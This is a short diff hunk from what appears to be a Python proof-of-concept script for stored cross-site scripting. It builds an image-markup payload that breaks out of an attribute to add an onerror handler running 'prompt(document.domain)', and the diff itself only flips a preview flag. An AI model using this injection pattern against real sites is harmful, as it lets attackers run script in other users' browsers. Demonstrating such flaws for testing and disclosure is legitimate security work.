@@ -15,7 +15,7 @@ import json
 newsId = 5865960
 cmd = "prompt(document.domain)"
 message = "hello word" #Required
-preview = 1
+preview = 0
 
 def main():
 	playload = "[image:http://www.googe.fr/xssed.png|325px||center||' onerror=%s style=display:none root=']%s" % (cmd, message)
